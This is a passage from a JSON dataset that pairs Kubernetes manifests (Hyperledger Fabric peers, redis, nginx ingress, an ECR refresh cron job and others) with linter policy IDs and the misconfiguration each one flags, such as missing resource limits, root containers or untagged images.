/etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel3\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org3peer1:30310\n        - name: CORE_PEER_LOCALMSPID\n          value: Org3MSP\n        - name: CORE_PEER_MSPID\n          value: Org3MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org3.example.com/users/Admin@org3.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n      - name: joinchannel4\n        image: hyperledger/fabric-peer:x86_64-1.0.4\n        imagePullPolicy: Always\n        command:\n        - sh\n        - -c\n        - 'peer channel fetch newest -o ${ORDERER_URL} -c ${CHANNEL_NAME} && peer\n          channel join -b ${CHANNEL_NAME}_newest.block '\n        env:\n        - name: CHANNEL_NAME\n          value: channel1\n        - name: CORE_PEER_NETWORKID\n          value: nid1\n        - name: ORDERER_URL\n          value: blockchain-orderer:31010\n        - name: CORE_PEER_ADDRESS\n          value: blockchain-org4peer1:30410\n        - name: CORE_PEER_LOCALMSPID\n          value: Org4MSP\n        - name: CORE_PEER_MSPID\n          value: Org4MSP\n        - name: CORE_LOGGING_LEVEL\n          value: debug\n        - name: CORE_PEER_MSPCONFIGPATH\n          value: /shared/crypto-config/peerOrganizations/org4.example.com/users/Admin@org4.example.com/msp\n        - name: FABRIC_CFG_PATH\n          value: /etc/hyperledger/fabric\n        - name: GODEBUG\n          value: netdns=go\n        volumeMounts:\n        - mountPath: /shared\n          name: sharedvolume\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"joinchannel4\" has memory limit 0"
  },
  {
    "id": "1940",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"dnstest3\" is using an invalid container image, \"xtoph/dns\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1941",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"dnstest3\" does not have a read-only root file system"
  },
  {
    "id": "1942",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"dnstest3\" is not set to runAsNonRoot"
  },
  {
    "id": "1943",
    "manifest_path": "data/manifests/the_stack_sample/sample_0447.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: dnstest3\nspec:\n  containers:\n  - image: xtoph/dns\n    command:\n    - /bin/sh\n    - -c\n    - --\n    args:\n    - while true; do sleep 5; done;\n    name: dnstest3\n    resources:\n      requests:\n        memory: 1G\n        cpu: 1\n    ports:\n    - containerPort: 80\n      name: http\n      protocol: TCP\n    - containerPort: 443\n      name: https\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"dnstest3\" has memory limit 0"
  },
  {
    "id": "1944",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"redis\" is using an invalid container image, \"redis\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1945",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"redis\" does not have a read-only root file system"
  },
  {
    "id": "1946",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"redis\" is not set to runAsNonRoot"
  },
  {
    "id": "1947",
    "manifest_path": "data/manifests/the_stack_sample/sample_0451.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: redis-deployment\n  labels:\n    app: redis\nspec:\n  selector:\n    matchLabels:\n      app: redis\n  template:\n    metadata:\n      labels:\n        app: redis\n    spec:\n      containers:\n      - name: redis\n        image: redis\n        resources:\n          limits:\n            memory: 128Mi\n            cpu: 500m\n        ports:\n        - containerPort: 6379\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"redis\" has cpu request 0"
  },
  {
    "id": "1948",
    "manifest_path": "data/manifests/the_stack_sample/sample_0452.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  labels:\n    name: frontend-service\n  name: frontend-service\nspec:\n  ports:\n  - protocol: TCP\n    port: 80\n    targetPort: 8080\n  selector:\n    name: frontend-node\n  type: LoadBalancer\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[name:frontend-node])"
  },
  {
    "id": "1949",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"ecr-refresh\" is using an invalid container image, \"public.ecr.aws/m3i7d4x6/ecr-refresh:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "1950",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"ecr-refresh\" does not have a read-only root file system"
  },
  {
    "id": "1951",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"svc-ecr-refresh\" not found"
  },
  {
    "id": "1952",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"ecr-refresh\" is not set to runAsNonRoot"
  },
  {
    "id": "1953",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"ecr-refresh\" has cpu request 0"
  },
  {
    "id": "1954",
    "manifest_path": "data/manifests/the_stack_sample/sample_0453.yaml",
    "manifest_yaml": "apiVersion: batch/v1beta1\nkind: CronJob\nmetadata:\n  name: ecr-refresh\nspec:\n  jobTemplate:\n    template:\n      spec:\n        containers:\n        - image: public.ecr.aws/m3i7d4x6/ecr-refresh:latest\n          name: ecr-refresh\n          env:\n          - name: AWS_REGION\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_region\n          - name: AWS_ACCESS_KEY_ID\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_access_key_id\n          - name: AWS_SECRET_ACCESS_KEY\n            valueFrom:\n              configMapKeyRef:\n                name: ecr-refresh\n                key: aws_secret_access_key\n          volumeMounts:\n          - name: config\n            mountPath: /config\n            readOnly: true\n        serviceAccountName: svc-ecr-refresh\n        volumes:\n        - name: config\n          configMap:\n            name: ecr-refresh\n            items:\n            - key: application.yml\n              path: application.yml\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"ecr-refresh\" has memory limit 0"
  },
  {
    "id": "1955",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"open-saves\" does not have a read-only root file system"
  },
  {
    "id": "1956",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"open-saves-ksa\" not found"
  },
  {
    "id": "1957",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"open-saves\" is not set to runAsNonRoot"
  },
  {
    "id": "1958",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"open-saves\" has cpu request 0"
  },
  {
    "id": "1959",
    "manifest_path": "data/manifests/the_stack_sample/sample_0454.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: open-saves-gke\n  labels:\n    app: open-saves-server\n  namespace: open-saves-namespace\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: open-saves-server\n  template:\n    metadata:\n      labels:\n        app: open-saves-server\n    spec:\n      containers:\n      - name: open-saves\n        image: gcr.io/triton-for-games-dev/triton-server:testing\n        imagePullPolicy: Always\n        ports:\n        - containerPort: 6000\n      serviceAccountName: open-saves-ksa\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"open-saves\" has memory limit 0"
  },
  {
    "id": "1960",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"nginx-ingress-lb\" does not expose port 10254 for the HTTPGet"
  },
  {
    "id": "1961",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx-ingress-lb\" does not have a read-only root file system"
  },
  {
    "id": "1962",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"nginx-ingress-lb\" does not expose port 10254 for the HTTPGet"
  },
  {
    "id": "1963",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx-ingress-lb\" is not set to runAsNonRoot"
  },
  {
    "id": "1964",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has cpu request 0"
  },
  {
    "id": "1965",
    "manifest_path": "data/manifests/the_stack_sample/sample_0456.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: ReplicationController\nmetadata:\n  name: nginx-ingress-controller\n  labels:\n    k8s-app: nginx-ingress-lb\nspec:\n  replicas: 1\n  selector:\n    k8s-app: nginx-ingress-lb\n  template:\n    metadata:\n      labels:\n        k8s-app: nginx-ingress-lb\n        name: nginx-ingress-lb\n    spec:\n      containers:\n      - image: gcr.io/google_containers/nginx-ingress-controller:0.8.3\n        name: nginx-ingress-lb\n        imagePullPolicy: Always\n        readinessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 10254\n            scheme: HTTP\n          initialDelaySeconds: 10\n          timeoutSeconds: 1\n        env:\n        - name: POD_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.name\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        ports:\n        - containerPort: 80\n          hostPort: 80\n        - containerPort: 443\n          hostPort: 443\n        args:\n        - /nginx-ingress-controller\n        - --default-backend-service=$(POD_NAMESPACE)/default-http-backend\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx-ingress-lb\" has memory limit 0"
  },
  {
    "id": "1966",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app.kubernetes.io/component: api\n    app.kubernetes.io/instance: observatorium-api\n    app.kubernetes.io/name: observatorium-api\n    app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n  name: observatorium-api\n  namespace: observatorium\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app.kubernetes.io/component: api\n      app.kubernetes.io/instance: observatorium-api\n      app.kubernetes.io/name: observatorium-api\n  template:\n    metadata:\n      labels:\n        app.kubernetes.io/component: api\n        app.kubernetes.io/instance: observatorium-api\n        app.kubernetes.io/name: observatorium-api\n        app.kubernetes.io/version: master-2020-09-04-v0.1.1-131-ga4c5a9c\n    spec:\n      containers:\n      - args:\n        - --web.listen=0.0.0.0:8080\n        - --web.internal.listen=0.0.0.0:8081\n        - --metrics.read.endpoint=http://127.0.0.1:9091\n        - --metrics.write.endpoint=http://127.0.0.1:19291\n        - --log.level=warn\n        - --logs.read.endpoint=http://127.0.0.1:3100\n        - --logs.tail.endpoint=http://127.0.0.1:3100\n        - --logs.write.endpoint=http://127.0.0.1:3100\n        - --rbac.config=/etc/observatorium/rbac.yaml\n        - --tenants.config=/etc/observatorium/tenants.yaml\n        - --web.healthchecks.url=https://127.0.0.1:8080\n        - --tls.server.cert-file=/var/run/tls/cert\n        - --tls.server.key-file=/var/run/tls/key\n        - --tls.healthchecks.server-ca-file=/var/run/tls/ca\n        - --tls.reload-interval=1m\n        - --tls.healthchecks.server-name=example.com\n        image: quay.io/observatorium/api:master-2020-09-04-v0.1.1-131-ga4c5a9c\n        livenessProbe:\n          failureThreshold: 10\n          httpGet:\n            path: /live\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 30\n        name: observatorium-api\n        ports:\n        - containerPort: 8081\n          name: internal\n        - containerPort: 8080\n          name: public\n        readinessProbe:\n          failureThreshold: 12\n          httpGet:\n            path: /ready\n            port: 8081\n            scheme: HTTP\n          periodSeconds: 5\n        resources: {}\n        volumeMounts:\n        - mountPath: /etc/observatorium/rbac.yaml\n          name: rbac\n          readOnly: true\n          subPath: rbac.yaml\n        - mountPath: /etc/observatorium/tenants.yaml\n          name: tenants\n          readOnly: true\n          subPath: tenants.yaml\n        - mountPath: /var/run/tls/cert\n          name: tls-secret\n          readOnly: true\n          subPath: cert\n        - mountPath: /var/run/tls/key\n          name: tls-secret\n          readOnly: true\n          subPath: key\n        - mountPath: /var/run/tls/ca\n          name: tls-configmap\n          readOnly: true\n          subPath: ca\n      serviceAccountName: observatorium-api\n      volumes:\n      - configMap:\n          name: observatorium-api\n        name: rbac\n      - name: tenants\n        secret:\n          secretName: observatorium-api\n      - name: tls-secret\n        secret:\n          secretName: observatorium-api-tls\n      - configMap:\n          name: observatorium-api-tls\n        name: tls-configmap\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 3 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "1967",
    "manifest_path": "data/manifests/the_stack_sample/sample_0457.yaml",
